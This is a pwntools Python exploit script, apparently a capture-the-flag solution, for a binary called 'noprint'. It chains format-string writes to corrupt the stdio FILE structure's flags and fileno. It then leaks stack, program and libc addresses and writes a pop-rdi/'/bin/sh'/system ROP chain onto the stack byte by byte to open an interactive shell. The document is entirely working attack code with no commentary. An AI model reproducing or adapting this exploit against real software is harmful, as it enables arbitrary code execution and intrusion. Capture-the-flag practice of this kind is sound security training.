from os import fpathconf
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./noprint"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


fileno_offset = 112
new_flag = 0x3e84
# new flag in file struct
payload = f"%{new_flag}c%9$hn"
io.sendlineafter("the void\n", payload)

# modify fileno 3->1 stdoussss
sleep(0.1)
payload = f"%*9$d%{fileno_offset}c%13$n".encode()
io.sendline(payload)
sleep(0.1)
payload = b"%1c%21$hhn"
io.sendline(payload)


# leak libc, stack
sleep(0.1)
payload = b"%16$p--%11$p--%12$p--\n\n"
io.sendline(payload)

off_16_stack = 0x5580298bb2e4 - 0x5580298ba000
off_11_stack =  0x7ffcf3fda890 - 0x7ffcf3fbb000
off_12_libc = 0x7f9ee27893b8 - 0x7f9ee275f000 
leak_app = int(io.recvuntil("--", drop=True)[-12:], 16) - off_16_stack
leak_stack = int(io.recvuntil("--", drop=True)[-12:], 16)
libc.address = int(io.recvuntil("--", drop=True)[-12:], 16) - off_12_libc
log.success("leak_app:-----> " + hex(leak_app))
log.success("base_stack:-----> " + hex(leak_stack))
log.success("libc:-----> " + hex(libc.address))

sleep(0.1)
payload = b"%3c%21$hhn\n\n"
io.sendline(payload)

new_flag = 0x3c84
# new flag in file struct
payload = f"%{new_flag}c%9$hn".ljust(0x100, "t")
io.send(payload)
sleep(0.1)


fprint_ret = leak_stack - 0xd8
sleep(0.5)

"""
0x00000000000cee4d : pop rdi ; ret
0x0000000000028a93 : ret

"""
pop_rdi = libc.address + 0x00000000000cee4d
binsh = next(libc.search("/bin/sh\x00"))
# ret = libc.address + 0x0000000000028a93
ret = leak_app + 0x12e3
systemaddr = libc.symbols["system"]

io.sendline(f"%{fprint_ret&0xffff}c%11$hn".encode())
def thj_write(target, val):
    for i in range(6):
        d = target + i
        v = val >> (8*i) & 0xff
        io.send(f"%{d&0xff}c%11$hhn".encode().ljust(0x100, b"\x00"))
        io.send(f"%{v&0xff}c%31$hhn".encode().ljust(0x100, b"\x00"))

thj_write(fprint_ret+8, pop_rdi)
thj_write(fprint_ret+8*2, binsh)
thj_write(fprint_ret+8*3, systemaddr)

log.success("pop_rdi:-----> " + hex(pop_rdi))
log.success("fprint_ret:-----> " + hex(fprint_ret))
log.success("ret:-----> " + hex(ret))
sleep(0.1)
io.sendline(f"%{fprint_ret&0xffff}c%11$hn".encode())
sleep(0.1)
# ddebug("breakrva 0x01386\ncontinue")
ddebug()
io.sendline(f"%{ret&0xffff}c%31$hn".encode())

io.interactive()

